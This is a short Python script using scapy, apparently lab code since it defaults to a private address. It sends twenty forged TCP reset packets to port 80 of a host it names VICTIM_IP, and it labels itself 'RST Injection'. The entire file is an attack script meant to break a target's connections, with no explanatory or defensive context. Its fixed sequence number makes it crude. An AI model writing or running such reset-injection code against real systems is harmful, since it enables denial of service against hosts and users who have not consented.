from scapy.all import IP, TCP, send
import sys

VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else '192.168.132.101'

print(f"[*] RST Injection -> {VICTIM_IP}")
for _ in range(20):
    pkt = IP(dst=VICTIM_IP) / \
          TCP(dport=80, flags='R', seq=1000)
    send(pkt, verbose=0)
print("[+] 20 RST packets sent")
